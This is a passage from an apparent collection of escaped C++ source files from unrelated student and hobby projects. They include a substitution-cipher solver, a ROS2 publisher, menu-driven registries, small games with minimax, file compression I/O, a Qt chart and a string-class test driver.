.:/\\n\\t          \\\\. /    `-._   `.\\\"\\\"-----.,-..::(--\\\"\\\".\\\\\\\"\\\"`.  `:\\\\ \\n  \\t           `P         `-._ \\\\          `-:\\\\          `. `:\\\\\\n   \\t\\t                   \\\"\\\"            \\\"            `-._)\";\r\n\tcout << shark << endl << endl;\r\n\r\n\tstring corpusFile(argv[1]), ciphertext(argv[2]), input = \"\";\r\n\tint numIterations = (argc == 4) ? atoi(argv[3]) : 500;\r\n\r\n\tcout << \"\\t[Automatic Monoalphabetic Substition Cipher Cryptanalysis]\" << endl << endl;\r\n\tdouble ic = CaesarSubSolve::calculateIC(ciphertext);\r\n\tcout << \"Index of Coincidence (IC) of Ciphertext: \" << ic << endl;;\r\n\r\n\tif (abs(ic - IC_ENGLISH) > .015) {\r\n\t\tcout << \"Warning: Index of Coincidence differs substantially from \" << IC_ENGLISH << endl;\r\n\t}\r\n\r\n\tCaesarSubSolve caesarSubSolver(corpusFile);\r\n\r\n\tcout << \"Now calculating possible decryptions...\" << endl;\r\n\tvector<string> possible_decryptions;\r\n\r\n\tfor (int i = 0; i < numIterations; i++) {\r\n\t\tpossible_decryptions.push_back(caesarSubSolver.decrypt(ciphertext));\r\n\t}\r\n\t\r\n\tcout << \"Now listing possible decryptions in order of fitness...\" << endl << endl;\r\n\r\n\tstd::sort(possible_decryptions.begin(), possible_decryptions.end(),\r\n\t\t[caesarSubSolver](const string& decryption1, const string& decryption2) {\r\n\t\t\treturn caesarSubSolver.evaluateFitness(decryption1) < caesarSubSolver.evaluateFitness(decryption2);\r\n\t\t});\r\n\r\n\tfor (int i = 0; i < numIterations; i++) {\r\n\t\tcout << \"Text: \" << possible_decryptions[i] << \" Fitness: \" << caesarSubSolver.evaluateFitness(possible_decryptions[i]) << endl;\r\n\t}\r\n\r\n\treturn 0;\r\n}\r\n",
    "#include \"rclcpp/rclcpp.hpp\"\n#include \"std_msgs/msg/string.hpp\"\n#include \"std_msgs/msg/int32.hpp\"\n#include \"geometry_msgs/msg/vector3.hpp\"\n#include <memory>\n#include <chrono>\n#include <functional>\n//#include <string>\nusing namespace std::chrono_literals;\nvoid callback(rclcpp::Node::SharedPtr node, rclcpp::Publisher<geometry_msgs::msg::Vector3>::SharedPtr pub)\n{\n    //static int count;\n    //auto message = std_msgs::msg::String();\n    auto input = geometry_msgs::msg::Vector3();\n    std::cin >> input.x;\n    std::cin >> input.y;\n    std::cin >> input.z;\n    //message.data = \"Hello world! \" + std::to_string(count++);\n    RCLCPP_INFO(node->get_logger(), \"Publish: %f %f %f\", input.x, input.y, input.z);\n    pub->publish(input);\n    \n}\nint main(int argc, char* argv[])\n{\n    rclcpp::init(argc, argv);\n    auto node = std::make_shared<rclcpp::Node>(\"mynode\");\n    auto qos_profile = rclcpp::QoS(rclcpp::KeepLast(10));\n    auto pub = node->create_publisher<geometry_msgs::msg::Vector3>(\"mytopic\", qos_profile);\n    std::function<void()> fn = std::bind(callback, node, pub);\n    auto timer = node->create_wall_timer(1s, fn);\n    rclcpp::spin(node);\n    rclcpp::shutdown();\n    return 0;\n}",
    "#include \"../header/funcoesMenu.hpp\"\n#include <iostream>\n//#include <unistd.h>\n\nusing namespace std;\n\nvoid cadastrarAstronautas(list<Astronauta> &astronautas){\n    system(\"clear\");\n    string cpf;\n    string nome;\n    int idade;\n    int choice;\n \n    cout << \"Informe o cpf do astronauta que deseja cadastrar: \";\n    cin >> cpf;\n    cout << \"Informe o nome do astronauta que deseja cadastrar: \";\n    cin >> nome;\n    cout << \"Informe a idade do astronauta que deseja cadastrar: \";\n    cin >> idade;\n\n    astronautas.push_back(Astronauta(cpf, nome, idade));\n    cout << \"Astronauta cadastrado com sucesso.\" << endl;\n\n    cout << \"Deseja retornar ao menu inicial?\" << endl;\n    cout << \"1 - Sim\" << endl;\n    cout << \"2 - N\u00e3o\" << endl;\n    cout << \"Escolha uma op\u00e7\u00e3o: \";\n    cin >> choice;\n\n    if (choice == 1) {\n        system(\"clear\");\n        cout << \"Voltando ao Menu Principal...\" << endl;\n        //sleep(2);\n        system(\"clear\");\n        return;\n    } else if (choice == 2){\n        system(\"clear\");\n        cadastrarAstronautas(astronautas);\n    } else {\n        cout << \"Valor inv\u00e1lido. Voltando ao Menu Principal...\" << endl;\n        //sleep(2);\n        system(\"clear\");\n        return;\n    }\n}\n    \nvoid cadastrarVoos(list<Voo> &voos){\n    system(\"clear\");\n    int codigoVoo;\n    int choice;\n\n    cout << \"Informe o c\u00f3digo do voo a ser planejado: \";\n    cin >> codigoVoo;\n\n    voos.push_back(Voo(codigoVoo));\n    cout << \"Voo cadastrado com sucesso.\" << endl;\n\n    cout << \"Deseja retornar ao menu inicial?\" << endl;\n    cout << \"1 - Sim\" << endl;\n    cout << \"2 - N\u00e3o\" << endl;\n    cout << \"Escolha uma op\u00e7\u00e3o: \";\n    cin >> choice;\n\n    if (choice == 1) {\n        system(\"clear\");\n        cout << \"Voltando ao Menu Principal...\" << endl;\n        //sleep(2);\n        system(\"clear\");\n        return;\n    } else if (choice == 2){\n        system(\"clear\");\n        cadastrarVoos(voos);\n    } else {\n        cout << \"Valor inv\u00e1lido. Voltando ao Menu Principal...\" << endl;\n        //sleep(2);\n        system(\"clear\");\n        return;\n    }\n}\n\nvoid adicionarAtronautaVoo(list<Voo> &voos, list<Astronauta> &astronautas, multimap<int, Astronauta> &passageiros, GerenciamentoVoo gerenciamentoVoo){\n    system(\"clear\");\n    string cpf;\n    int codigoVoo;\n    int choice;\n\n    cout << \"Informe o cpf do astrounauta que deseja adicionar em algum voo: \";\n    cin >> cpf;\n    cout << \"Informe o c\u00f3digo do voo que o astronauta ser\u00e1 adicionado: \";\n    cin >> codigoVoo;\n\n    for (auto ita = astronautas.begin(); ita != astronautas.end(); ita++) {\n        if (ita->getCpf() == cpf) {\n            for (auto it = voos.begin(); it != voos.end(); it++) {\n                if ((it)->getCodigo() == codigoVoo) {\n                    gerenciamentoVoo.adicionarAstronautaEmVoo(codigoVoo, (*ita), passageiros);\n                }\n            }\n        }\n    }\n    \n    cout << \"Deseja retornar ao menu inicial?\" << endl;\n    cout << \"1 - Sim\" << endl;\n    cout << \"2 - N\u00e3o\" << endl;\n    cout << \"Escolha uma op\u00e7\u00e3o: \";\n    cin >> choice;\n\n    if (choice == 1) {\n        system(\"clear\");\n        cout << \"Voltando ao Menu Principal...\" << endl;\n        //sleep(2);\n        system(\"clear\");\n        return;\n    } else if (choice == 2){\n        system(\"clear\");\n        adicionarAtronautaVoo(voos, astronautas, passageiros, gerenciamentoVoo);\n    } else {\n        cout << \"Valor inv\u00e1lido. Voltando ao Menu Principal...\" << endl;\n        //sleep(2);\n        system(\"clear\");\n        return;\n    }\n    \n}\n\nvoid removerAstronautaVoo(list<Voo> &voos, list<Astronauta> &astronautas, multimap<int, Astronauta> &passageiros, GerenciamentoVoo gerenciamentoVoo){\n    system(\"clear\");\n    string cpf;\n    int codigoVoo;\n    int choice;\n    bool verifica = false;\n    list<Voo>::iterator it;\n\n    cout << \"Informe o c\u00f3digo do voo que ter\u00e1 o(s) astronauta(s) removido(s): \";\n    cin >> codigoVoo;\n\n    for (it = voos.begin(); it != voos.end(); ++it) {\n        if ((it)->getCodigo() == codigoVoo) {\n            verifica = true;\n        }\n    }\n\n    if (verifica) {\n        verifica = false;\n    } else {\n        cout << \"Voo n\u00e3o encontrado\" << endl;\n        //sleep(2);\n        system(\"clear\");\n        removerAstronautaVoo(voos, astronautas, passageiros, gerenciamentoVoo);\n    }\n\n    do {   \n        cout << \"Informe o cpf do astronauta a ser removido: \";\n        cin >> cpf;\n\n        for (auto ita = astronautas.begin(); ita != astronautas.end(); ++ita) {\n            if ((ita)->getCpf() == cpf) {\n                gerenciamentoVoo.removerAstronautaDeVoo(codigoVoo, (*ita), verifica, passageiros);\n            }\n        }\n\n        do {\n            cout << \"Deseja remover outro astronauta desse voo\" << endl;\n            cout << \"1 - sim | 2 - n\u00e3o\" << endl;\n            cin >> choice;\n        } while ((choice != 1) && (choice != 2));\n    } while (choice != 2);\n    \n    system(\"clear\");\n    cout << \"Deseja retornar ao menu inicial?\" << endl;\n    cout << \"1 - Sim\" << endl;\n    cout << \"2 - N\u00e3o\" << endl;\n    cout << \"Escolha uma",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   Character.cpp                                      :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: oldault <oldault@student.42.fr>            +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/05/04 21:01:19 by oldault           #+#    #+#             */\n/*   Updated: 2024/05/06 17:03:58 by oldault          ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"Character.hpp\"\n\nCharacter::Character(const std::string& name) :\n  _name(name),\n  _amountStored(0)\n{\n  for (int i = 0; i < 4; i++) {\n    _inventory[i] = nullptr;\n  }\n  std::cout << FGRN( \"Character \" BOLD( << _name << )) << FGRN(\" constructor called\\n\");\n  \n  return ;\n}\n\nCharacter::Character(const Character& src) :\n  _name(src._name),\n  _amountStored(src._amountStored)\n{\n  for (int i = 0; i < 4; i++) {\n    _inventory[i] = src._inventory[i];\n  }\n  std::cout << FGRN(\"Character copy constructor called from \" BOLD( << src._name <<)) \"\\n\";\n}\n\nCharacter::~Character()\n{\n  for (int i = 0; i < 4; i++) {\n    if (_inventory[i] != nullptr) {\n      delete _inventory[i];\n    }\n  }\n  std::cout << FRED( \"Character \" BOLD( << _name << )) << FRED(\" destructor called\\n\");\n\n  return ;\n}\n\nCharacter& Character::operator=(const Character& src)\n{\n  if (this != &src) {\n    _name = src._name;\n    _amountStored = src._amountStored;\n    for (int i = 0; i < 4; i++) {\n      _inventory[i] = src._inventory[i];\n    }\n  }\n  std::cout << FGRN(\"Character copy operator called from \" BOLD( << src._name <<)) \"\\n\";\n\n  return *this;\n}\n\n\nconst std::string& Character::getName() const\n{\n  return _name;\n}\n\nvoid Character::equip(AMateria* m)\n{\n  if (m == nullptr) {\n    std::cout << BRED(\"Cannot equip unexisting Materia\") << \"\\n\";\n    return ;\n  }\n  if (_amountStored >= 4) {\n    std::cout << BRED(\"Cannot equip any more Materias. Storage capacity (4) exceeded\") << \"\\n\";\n    return ;\n  }\n  for (unsigned int i = 0; i < 4; i++) {\n    if (_inventory[i] == nullptr) {\n      _inventory[i] = m->clone();\n      _amountStored++;\n      std::cout << FYEL(\"Character \") << FYEL(BOLD( << _name << )) << FYEL(\" just equipped the \") << FYEL(BOLD( << m->getType() << )) << FYEL(\" Materia, on slot \") << FYEL(UNDL( << i << )) << FYEL(\".\\n\");\n      return ;\n    }\n  }\n\n  return ;\n}\n\nvoid Character::unequip(int idx)\n{\n  if (_inventory[idx] == nullptr) {\n    std::cout << BRED(\"Nothing to unequip at slot \") << UNDL(BRED( << idx << )) << \"\\n\";\n    return ;\n  }\n  std::cout << FYEL(\"Unequipping slot \") << UNDL(FYEL( << idx << )) << FYEL(\" storing the \") << FYEL(BOLD( << _inventory[idx]->getType() <<  )) << FYEL(\" Materia.\\n\");\n  delete _inventory[idx];\n  _inventory[idx] = nullptr;\n  _amountStored--;\n  \n  return ;\n}\n\nvoid Character::use(int idx, ICharacter& target)\n{\n  if (_inventory[idx] == nullptr) {\n    std::cout << BRED(\"Nothing to use at slot \") << UNDL(BRED( << idx << )) << \"\\n\";\n    return ;\n  }\n  _inventory[idx]->use(target);\n  \n  return ;\n}\n",
    "#include \"shop.h\"\n#include \"Tool.h\"\n#include <iostream> \n#include <sstream>\n#include \"element.h\"\n\nShop::Shop(const std::vector<std::shared_ptr<Spell>>& spellsAvailable) : spells(spellsAvailable) {}\n\n\nvoid Shop::displayAndBuySpells(Hero& god){\n    system(\"clear\");\n    Too.slow_print(\"Here are the spells we sell: \");\n    Too.delay();\n    std::cout << std::endl;\n\n    int index = 1;\n    \n    std::cout << \"_____________________________________________________________________________________________________________________\" << std::endl;\n    for(const auto& spell : spells) {\n        std::string requiredSpell = spell->getRequired() ?  spell -> getRequired()->getName() : \"None\";\n        std::cout << index++ << \". \" << spell->getName() << \" - Damage: \" << spell-> getDamage() << \"- Element: \" << elementToString(spell-> getElement()) <<  \" - Mana: \" << spell->getManaCost() <<\" - Cost: \" << spell->getGoldPrice() << \" Gold\" << \"- requirements: \" << requiredSpell << std::endl << std::endl; \n        std::cout << \"_____________________________________________________________________________________________________________________\" << std::endl;\n    }\n\n\n    std::cout << \"Enter the number of the spell you wish to purchase or 0 to exit: \";\n    \n    char cho;\n    int choice;\n    cho = Too.getKeypress();\n    choice = cho - '0';\n    if(choice > 0 && choice <= spells.size()){\n        auto selectedSpell = spells[choice - 1];\n        if(god.getGold() >= selectedSpell->getGoldPrice()) {\n            if(god.hasSpell(selectedSpell->getID())){\n                std::ostringstream message;\n                message << \"You already own this spell.\" << std::endl;\n                Too.slow_print(message.str());\n                Too.delay();\n                displayAndBuySpells(god);\n            } else {\n\n                if(selectedSpell->getRequired() == nullptr || god.hasSpell(selectedSpell->getRequired()->getID())){\n                    god.addGold(-selectedSpell->getGoldPrice());\n                    god.learnSpell(selectedSpell);\n                    std::ostringstream message;\n                    message << \"You have successfully purchased \" << selectedSpell->getName() << \"!\" << std::endl;  \n                    Too.slow_print(message.str());\n                    Too.delay();\n                    displayAndBuySpells(god);\n                } else {\n                    std::cout << \"You need to learn \" << selectedSpell->getRequired()->getName() << \" first. \" << std::endl;\n                }\n            }\n        } else {\n            std::cout << \"You do no have enough gold.\" << std::endl;\n        }\n    } else if(choice == 0){\n        system(\"clear\");\n        Too.slow_print(\"Come back another time!\");\n        std::cout << std::endl << std::endl;\n    } else{\n        std::cout << \"Invalid Selection.\";\n    }\n\n}",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <exception>\n#include <sstream>\n#include <ctime>\n\n#define LIGHT_RED \"\\033[91m\";\n#define BLUE \"\\033[36m\";\n#define RESET_COLOR \"\\033[0m\";\nconst int SZ = 3;\n\nusing namespace std;\n\nclass Board {\n\tvector<char> b;\npublic:\n\tBoard() : b(SZ*SZ, ' ') {}\n\t~Board() {}\n\tBoard(const Board& board) : b(board.b) {}\n\n\tvoid display(int cell1 = -1, int cell2 = -1, int cell3 = -1) {\n\t\tcout << \"-------------\\n\";\n\t\tfor (int i = 0; i < SZ; i++) {\n\t\t\tcout << \"| \";\n\t\t\tfor (int j = 0; j < SZ; j++) {\n\t\t\t\tif (cell1 == -9) cout << BLUE;\n\t\t\t\tif (i * SZ + j == cell1 - 1 || i * SZ + j == cell2 - 1 || i * SZ + j == cell3 - 1) cout << LIGHT_RED;\n\t\t\t\tcout << b[i * SZ + j] << RESET_COLOR;\n\t\t\t\tcout << \" | \";\n\t\t\t}\n\t\t\tcout << \"\\n-------------\\n\";\n\t\t}\n\t}\n\tbool cellEmpty(int cell) {\n\t\tif (b[cell - 1] == ' ') return true;\n\t\treturn false;\n\t}\n\tbool checkFull() {\n\t\tfor (int i = 0; i < 9; i++) if (b[i] == ' ') return false;\n\t\treturn true;\n\t}\n\tbool checkWin(char symbol) {\n\t\tfor (int i = 0; i < SZ; i++) {\n\t\t\tif (b[i] == symbol && b[i] == b[i + 3] && b[i] == b[i + 6]) return true;\n\t\t\tif (b[i * 3] == symbol && b[i * 3] == b[i * 3 + 1] && b[i * 3] == b[i * 3 + 2]) return true;\n\t\t}\n\t\tif (b[0] == symbol && b[0] == b[4] && b[0] == b[8]) return true;\n\t\tif (b[2] == symbol && b[2] == b[4] && b[2] == b[6]) return true;\n\t\treturn false;\n\t}\n\tvoid makeMove(int cell, char symbol) {\n\t\tb[cell - 1] = symbol;\n\t}\n\tvector<int> availableMoves() {\n\t\tvector<int> v;\n\t\tfor (int i = 1; i < 10; i++) if (cellEmpty(i)) v.push_back(i);\n\t\treturn v;\n\t}\n\tvoid displayWin(char symbol) {\n\t\tint c1, c2, c3;\n\t\tif (b[0] == symbol && b[0] == b[4] && b[0] == b[8]) { c1 = 0; c2 = 4; c3 = 8; }\n\t\telse if (b[2] == symbol && b[2] == b[4] && b[2] == b[6]) { c1 = 2; c2 = 4; c3 = 6; }\n\t\telse \n\t\t\tfor (int i = 0; i < SZ; i++) {\n\t\t\t\tif (b[i] == symbol && b[i] == b[i + 3] && b[i] == b[i + 6]) { c1 = i; c2 = i + 3; c3 = i + 6; }\n\t\t\t\tif (b[i * 3] == symbol && b[i * 3] == b[i * 3 + 1] && b[i * 3] == b[i * 3 + 2]) { c1 = i * 3; c2 = i * 3 + 1; c3 = i * 3 + 2; }\n\t\t\t}\n\t\tc1++; c2++; c3++;\n\t\tdisplay(c1, c2, c3);\n\t}\n};\n\nclass Player {\n\tchar symbol;\npublic:\n\tPlayer(char s) : symbol(s) {}\n\tvirtual ~Player(){}\n\tPlayer(const Player& p) :symbol(p.symbol) {}\n\tvirtual Player* clone() const = 0;\n\n\tchar getSymbol() { return symbol; }\n\tvirtual void move(Board &b) = 0;\n};\n\nclass Human : public Player {\npublic:\n\tHuman(char s) : Player(s) {}\n\t~Human() {}\n\tHuman(const Human& h) :Player(h) {}\n\tPlayer* clone() const { return new Human(*this); }\n\n\tvoid move(Board& b) {\n\t\tcout << \"\\nNguoi choi \" << getSymbol() << \" chon vi tri danh (1-9): \";\n\t\tstring s; cin >> s;\n\t\tstringstream ss(s);\n\t\tint cell; ss >> cell;\n\t\ttry {\n\t\t\tif (cell < 1 || cell>9) throw out_of_range(\"-O khong hop le!\\n-Vui long chon lai!\\n\\n\");\n\t\t\telse if (!b.cellEmpty(cell)) throw invalid_argument(\"-O da duoc chon!\\n-Vui long chon lai!\\n\\n\");\n\t\t\telse {\n\t\t\t\tb.makeMove(cell, getSymbol());\n\t\t\t\tb.display(cell);\n\t\t\t}\n\t\t}\n\t\tcatch (out_of_range& e) {\n\t\t\tcerr << e.what();\n\t\t\tmove(b);\n\t\t}\n\t\tcatch (invalid_argument& e) {\n\t\t\tcerr << e.what();\n\t\t\tmove(b);\n\t\t}\n\t}\n};\n\nclass Computer : public Player {\n\tchar OSymbol;\n\n\tint minimax(Board b, int d, bool mp, char self, char opponent) {\n\t\tif (b.checkWin(self)) return 1;\n\t\tif (b.checkWin(opponent)) return -1;\n\t\tif (b.checkFull() || d == 0) return 0;\n\n\t\tvector<int> moves = b.availableMoves();\n\n\t\tif (mp) {\n\t\t\tint score = -10;\n\t\t\tfor (int move : moves) {\n\t\t\t\tb.makeMove(move, self);\n\t\t\t\tscore = max(score, minimax(b, d - 1, false, self, opponent));\n\t\t\t\tb.makeMove(move, ' ');\n\t\t\t}\n\t\t\treturn score;\n\t\t}\n\t\telse {\n\t\t\tint score = 10;\n\t\t\tfor (int move : moves) {\n\t\t\t\tb.makeMove(move, opponent);\n\t\t\t\tscore = min(score, minimax(b, d - 1, true, self, opponent));\n\t\t\t\tb.makeMove(move, ' ');\n\t\t\t}\n\t\t\treturn score;\n\t\t}\n\t}\npublic:\n\tComputer(char s) :Player(s), OSymbol(' ') {}\n\t~Computer() {}\n\tComputer(const Computer& c) :Player(c), OSymbol(c.OSymbol) {}\n\tPlayer* clone() const { return new Computer(*this); }\n\n\tvoid setOSymbol(char s) { OSymbol = s; }\n\tint getBestMove(Board b, char self, char opponent) {\n\t\tint bestScore = -10, bestMove = -10;\n\n\t\tvector<int> moves = b.availableMoves();\n\t\tfor (int move : moves) {\n\t\t\tb.makeMove(move, self);\n\t\t\tint score = minimax(b, 5, false, self, opponent);\n\t\t\tb.makeMove(move, ' ');\n\t\t\tif (score > bestScore) {\n\t\t\t\tbestScore = score;\n\t\t\t\tbestMove = move;\n\t\t\t}\n\t\t}\n\t\treturn bestMove;\n\t}\n\tvoid move(Board& b) {\n\t\tint cell = getBestMove(b, getSymbol(), OSymbol);\n\t\tb.makeMove(cell, getSymbol());\n\t\tcout << \"\\nNguoi may \" << getSymbol() << \": \" << cell << endl;\n\t\tb.display(cell);\n\t}\n};\n\nclass Game {\n\tBoard b;\n\tPlayer* p1, * p2;\npublic:\n\tGame() :p1(NULL), p2(NULL) {}\n\t~Game() { delete p1; delete p2; }\n\tGame(const Game& g) : b(g.b), p1(NULL), p2(NULL) {\n\t\tif (g.p1) p1 = g.p1->clone();\n\t\tif (g.p2) p2 = g.p2->clone();\n\t}\n\n\tvoid start() {\n\t\tcout << \"Chao mung den voi Tro choi Tic Tac Toe!\\n\";\n\t\tcout << \"Ban co the nhap vi tri cua o ma ban muon danh.\\n\";\n\t\tcout << \"Vi tri tu 1 den 9 duoc",
    "#include <iostream>\n#include <vector>\n#include <fstream>\n\nusing namespace std;\n\n\nvoid escribir_archivo_comprimido(vector<int> texto_comprimido, string nombre_archivo) {\n    ofstream archivo(nombre_archivo + \".bin\", ios::binary);\n    if (archivo.is_open()) {\n        for (int valor : texto_comprimido) {\n            unsigned short binario = static_cast<unsigned short>(valor);\n            archivo.write(reinterpret_cast<const char*>(&binario), sizeof(binario));\n        }\n        archivo.close();\n    }\n    else {\n        cout << \"Error al abrir el archivo binario\";\n    }\n}\n\n\nvector<int> leer_archivo_comprimido(string nombre_archivo) {\n    ifstream archivo(nombre_archivo + \".bin\", ios::binary);\n    vector<int> contenido;\n\n    if (archivo.is_open()) {\n        unsigned short valor_binario;\n\n        while (archivo.read(reinterpret_cast<char*>(&valor_binario), sizeof(valor_binario))) {\n            int valor = static_cast<int>(valor_binario);\n            contenido.push_back(valor);\n        }\n\n        archivo.close();\n    }\n    else {\n        cout << \"Error abriendo el archivo binario\";\n    }\n\n    return contenido;\n}\n\n\n\nvoid escribir_archivo_plano(string texto_completo, string nombre_archivo) {\n\tofstream archivo(nombre_archivo + \".txt\");\n\tif (archivo.is_open()) {\n\t\tarchivo << texto_completo;\n\t\tarchivo.close();\n\t}\n\telse {\n\t\tcout << \"Error al escribir el archivo plano\";\n\t}\n\n\treturn;\n}\n\n\n",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include \"event.h\"\n#include\"connection.h\"\n#include \"stat_ressource.h\"\n#include \"ui_stat_ressource.h\"\n#include <QtMath>\n\nstat_ressource::stat_ressource(QWidget *parent) :\n    QMainWindow(parent),\n    ui(new Ui::stat_ressource)\n{\n    ui->setupUi(this);\n}\n\nstat_ressource::~stat_ressource()\n{\n    delete ui;\n}\n\nint stat_ressource::Statistique_partie2()\n{\n    QSqlQuery requete(\"SELECT * FROM EVENTS WHERE EVENTFEE BETWEEN '1000' AND '2000'\");\n    int count = 0;\n\n    while (requete.next())\n    {\n        count++;\n    }\n\n    return count;\n}\n\nint stat_ressource::Statistique_partie3()\n{\n    QSqlQuery requete(\"SELECT * FROM EVENTS WHERE EVENTFEE BETWEEN '2000' AND '3000'\");\n    int count = 0;\n\n    while (requete.next())\n    {\n        count++;\n    }\n\n    return count;\n}\n\nint stat_ressource::Statistique_partie4()\n{\n    QSqlQuery requete(\"SELECT * FROM EVENTS WHERE EVENTFEE > '3000'\");\n    int count = 0;\n\n    while (requete.next())\n    {\n        count++;\n    }\n\n    return count;\n}\n\nvoid stat_ressource::drawLabel(const QRectF &size, float angle, const QString &text, float percentage, QPainter *painter)\n{\n    QFont font = painter->font();\n    font.setPointSize(10);\n    painter->setFont(font);\n\n    // Calculate label position\n    QPointF labelPos = size.center() + QPointF(size.width() / 2 * qCos(qDegreesToRadians(angle)),\n                                               size.height() / 2 * qSin(qDegreesToRadians(angle)));\n\n    // Draw the pie chart segments\n    painter->drawText(QRectF(labelPos, QSizeF(50, 50)), Qt::AlignCenter, QString(\"%1\\n%2%\").arg(text).arg(percentage * 100, 0, 'f', 2));\n}\n\nvoid stat_ressource::paintEvent(QPaintEvent *)\n{\n    int b = Statistique_partie2();\n    int c = Statistique_partie3();\n    int d = Statistique_partie4();\n\n    // Total event count calculation\n    float totalEvents = b + c + d;\n\n    // Percentage of each event fee range\n    float percentageRange1 = b / totalEvents;\n    float percentageRange2 = c / totalEvents;\n\n    // Angle calculations for pie chart\n    float angleRange1 = (percentageRange1 * 360);\n    float angleRange2 = (percentageRange2 * 360);\n\n    // Calculate the remaining angle for other event fee components\n    float angleRemaining = 360 - (angleRange1 + angleRange2);\n\n    // Update the QPainter section based on the calculated angles\n    QPainter painter(this);\n    QRectF size = QRectF(50, 50, this->width() - 500, this->width() - 500);\n\n    // Draw the pie chart segments\n    painter.setBrush(Qt::red);\n    painter.drawPie(size, 0, 16 * angleRange1);\n    drawLabel(size, angleRange1 / 2, \"'1000' AND '2000'\", percentageRange1, &painter);\n\n    painter.setBrush(Qt::green);\n    painter.drawPie(size, 16 * angleRange1, 16 * angleRange2);\n    drawLabel(size, angleRange1 + angleRange2 / 2, \"'2000' AND '3000'\", percentageRange2, &painter);\n\n    painter.setBrush(Qt::blue);\n    painter.drawPie(size, 16 * (angleRange1 + angleRange2), 16 * angleRemaining);\n    drawLabel(size, angleRange1 + angleRange2 + angleRemaining / 2, \"'3000'++'\", angleRemaining / 360, &painter);\n}\n",
    "#include <iostream>\n#include <stdio.h>\n#include \"Charmander.h\"\n#include \"Pokemon.h\"\n\n/**\n * @brief Construct a new Charmander:: Charmander object\n * \n*/\nCharmander:: Charmander() : Pokemon() {\n    type.push_back(\"Fire\");\n    skills.push_back(\"Growl\");\n    skills.push_back(\"Scratch\");\n\n    cout << \"Default Constructor (Charmander)\\n\";\n}\n\n/**\n * @brief Construct a new Charmander:: Charmander object\n * \n * @param name\n * @param hp\n * @param att\n * @param def\n * @param t\n*/\nCharmander::Charmander(string name, int hp, int att, int def, vector<string> t, vector<string> s):\n Pokemon(name, hp, att, def, t) {\n    type = t;\n    skills = s;\n    cout << \"Overloaded Constructor (Charmander)\\n\";\n}\n\n /**\n  * @brief says what a charmander says\n  * \n */\nvoid Charmander::speak(){\n    cout << \"Charmander-char\\n\";\n}\n\n/**\n * @brief call printStats from the parent class (Pokemon) and appends the skills used for Charmander\n * \n*/\nvoid Charmander::printStats(){\n    Pokemon::printStats();\n    cout << \"Skills: \";\n    for(int i = 0; i < skills.size(); i++){\n        cout << skills[i] << \"\\t\";\n    }\n    cout << endl;\n}",
    "/*\n * Name: Grant Johnson, Ethan Sychangco\n * Email: Gmjohnson@scu.edu, Esychangco@scu.edu\n */\n\n#include <iostream>\n#include \"mystring.h\"\n\nusing namespace lab5GE;\n\nint main(){\n    // TEST CONSTRUCTOR by initializing three strings in 3 different ways\n    std::cout << \"\\n[Testing Constructor]\" << std::endl;\n    string s1; // default constructor\n    string s2('s'); // char constructor\n    string s3(\"Hello, World!\"); // string constructor\n\n    std::cout << \"s1: \" << s1 << std::endl;\n    std::cout << \"s2: \" << s2 << std::endl;\n    std::cout << \"s3: \" << s3 << std::endl;\n\n\n    // TEST += operator\n    std::cout << \"\\n[Testing +=]\" << std::endl;\n\n    std::cout << \"s1 length = \" << s1.length() << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl; \n    s1 += 'A';\n    std::cout << \"s1 length = \" << s1.length() << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl;\n    s1 += 'B';\n    std::cout << \"s1 length = \" << s1.length() << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl;\n    s1 += 'C';\n    std::cout << \"s1 length = \" << s1.length() << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl;\n\n\n    // TEST [] operator\n    std::cout << \"\\n[Testing []]\" << std::endl;\n\n    std::cout << \"s1[0]: \" << s1[0] << std::endl;\n    std::cout << \"s1[1]: \" << s1[1] << std::endl;\n    std::cout << \"s1[2]: \" << s1[2] << std::endl;\n\n\n    // TEST == operator\n    std::cout << \"\\n[Testing =]\" << std::endl;\n\n    std::cout << \"s3 before s3 = s1: \" << s3 << std::endl;\n    s3 = s1;\n    std::cout << \"s3 after s3 = s1: \" << s3 << std::endl;\n    std::cout << \"s2 before s2 = s2: \" << s2 << std::endl;\n    s2 = s2;\n    std::cout << \"s2 after s2 = s2: \" << s2 << std::endl;\n\n\n    // TEST COMPARISON operators\n    std::cout << \"\\n[Testing Comparisons]\" << std::endl;\n    string A('A');\n    string B('B');\n\n    std::cout << \"A == A: \" << (A == A) << std::endl;\n    std::cout << \"A == B: \" << (A == B) << std::endl;\n    std::cout << \"A != A: \" << (A != A) << std::endl;\n    std::cout << \"A != B: \" << (A != B) << std::endl;\n    std::cout << \"A > A: \" << (A > A) << std::endl;\n    std::cout << \"A > B: \" << (A > B) << std::endl;\n    std::cout << \"B > A: \" << (B > A) << std::endl;\n    std::cout << \"A >= A: \" << (A >= A) << std::endl;\n    std::cout << \"A >= B: \" << (A >= B) << std::endl;\n    std::cout << \"B >= A: \" << (B >= A) << std::endl;\n    std::cout << \"A < A: \" << (A < A) << std::endl;\n    std::cout << \"A < B: \" << (A < B) << std::endl;\n    std::cout << \"B < A: \" << (B < A) << std::endl;\n    std::cout << \"A <= A: \" << (A <= A) << std::endl;\n    std::cout << \"A <= B: \" << (A <= B) << std::endl;\n    std::cout << \"B <= A: \" << (B <= A) << std::endl;;\n\n    \n    // TEST OUTPUT operator\n    string input;\n    std::cout << \"\\n[Testing <<]\" << std::endl;\n    std::cout << \"Please enter a word: \";\n    std::cin >> input;\n    std::cout << \"You entered: \" << input << std::endl;\n\n\n    // TEST INSERT function\n    // s1 should be \"ABC\" at this point\n    std::cout << \"\\n[Testing insert()]\" << std::endl;\n    string sinsert1 = string(\"Strings like \");\n    string sinsert2 = string(\" are **~very~** epic.\");\n\n    std::cout << \"s1: \" << s1 << std::endl; \n    s1.insert(string('D'), 3); // <?> INDEX IS 3 OR 4???\n    std::cout << \"-> Insert 'D' at pos 3 \" << std::endl; \n    std::cout << \"s1: \" << s1 << std::endl; \n    s1.insert(sinsert1, 0);\n    std::cout << \"-> Insert \\\"\" << sinsert1 << \"\\\" at pos 0 \" << 